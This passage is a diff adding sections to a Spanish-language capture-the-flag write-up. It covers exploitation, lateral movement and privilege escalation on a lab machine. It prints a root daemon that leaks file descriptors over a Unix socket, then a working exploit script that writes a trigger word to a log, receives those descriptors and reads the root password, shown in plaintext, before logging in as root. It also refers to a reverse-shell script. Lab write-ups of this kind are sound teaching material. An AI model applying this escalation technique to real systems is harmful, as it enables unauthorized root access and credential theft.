@@ -186,6 +186,8 @@ print(f"{self.id} Executing archive for: {job_name}")
 subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
 ```
 
+## Exploitation
+
 Para obtener una reverse shell aprovechando la ejecución de comandos creamos un script en Python
 
 ```python
@@ -232,6 +234,10 @@ Y ejecutamos el script para obtener una reverse shell
 ```python
 python3 rev.py 10.10.16.99 1111
 ```
+
+## Lateral Movement
+
+Una vez dentro del sistema como el usuario `lp` enumeramos servicios internos
 
 ```bash
 ss -tlp
@@ -492,4 +498,190 @@ cat user.txt
 
 <Callout type="success" title="User flag">
 c******************************4
+</Callout>
+
+## Privilege Escalation
+
+```bash
+systemctl cat paperwork
+```
+
+```
+# /etc/systemd/system/paperwork.service
+[Unit]
+Description=Paperwork Management Daemon
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
+Restart=always
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
+```
+
+```bash
+cat /usr/bin/paperwork-daemon
+```
+
+```python
+#!/usr/bin/python3
+import socket, os, array, hashlib
+import zipfile
+import shutil
+
+try:
+    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
+except Exception:
+    os._exit(1)
+
+LOG_PATH = "/home/archivist/printer/logs/commands.log"
+
+def get_admin_secret():
+    data = os.pread(admin_fd, 1024, 0).decode().strip()
+    if "ADMIN_PASSWORD=" in data:
+        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
+    return data
+
+def scan_for_malice():
+    if not os.path.exists(LOG_PATH):
+        return False
+    with open(LOG_PATH, 'r') as f:
+        content = f.read().upper()
+        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
+            return True
+    return False
+
+def trigger_lockdown(conn):
+    try:
+        log_fd = os.open(LOG_PATH, os.O_RDONLY)
+        evidence_bundle = array.array("i", [log_fd, admin_fd])
+        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
+        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
+
+        zip_path = "/root/quarantine/evidence.zip"
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            zipf.write(LOG_PATH, arcname="commands.log")
+
+
+        with open(LOG_PATH, 'w') as f:
+            f.truncate(0)
+
+        os.close(log_fd)
+    except:
+        pass
+
+def main():
+    socket_path = "/run/paperwork/mgmt.sock"
+    if os.path.exists(socket_path): os.remove(socket_path)
+    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")
+
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.bind(socket_path)
+    os.chmod(socket_path, 0o660)
+    os.chown(socket_path, 0, 1000) 
+    s.listen(5)
+
+    while True:
+        conn, _ = s.accept()
+        
+        if scan_for_malice():
+            trigger_lockdown(conn)
+        else:
+            secret = get_admin_secret()
+            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
+            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
+            
+        conn.close()
+
+if __name__ == "__main__":
+    main()
+```
+
+El script escucha en un socket `/run/paperwork/mgmt.sock`, los permisos indican que nos podemos conectar
+
+```bash
+ls -l /run/paperwork/mgmt.sock
+```
+
+```plaintext
+srw-rw---- 1 root archivist 0 Jul 14 14:24 /run/paperwork/mgmt.sock
+```
+
+```python
+import socket
+
+s = socket.socket(socket.AF_UNIX)
+
+s.connect("/run/paperwork/mgmt.sock")
+
+print(s.recv(4096).decode())
+```
+
+```bash
+python3 priv.py
+```
+
+```plaintext
+STATUS: SYSTEM_CLEAN
+SIGNATURE: d92938059e3e5371cf54db65d60963aecacedf69e493c44a8b618036b07cbdbe
+```
+
+`scan_for_malice` retorna `True` si el log contiene alguno de los comandos `FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD`. Lo que hace después es enviar dos file descriptors abiertos por root.
+
+Escribimos un script para conectarlos al socket y leer los file descriptors.
+
+```python
+import socket
+import array
+import os
+
+os.system("echo FSUPLOAD >> /home/archivist/printer/logs/commands.log")
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+
+_, ancdata, _, _ = s.recvmsg(4096, socket.CMSG_SPACE(8))
+
+fds = array.array("i")
+fds.frombytes(ancdata[0][2])
+
+print(os.pread(fds[1], 4096, 0).decode())
+```
+
+Ejecutamos el script y obtenemos el contenido del file descriptor con la contraseña del usuario `root`
+
+```bash
+python3 priv.py
+```
+
+```plaintext
+ADMIN_PASSWORD=ApparelMortuaryCedar22
+```
+
+Nos logueamos como `root`
+
+```bash
+su - root
+```
+
+```bash
+ls
+
+```plaintext
+root.txt  staging
+```
+
+Y obtenemos la flag de `root`
+
+```bash
+cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+3******************************f
 </Callout>
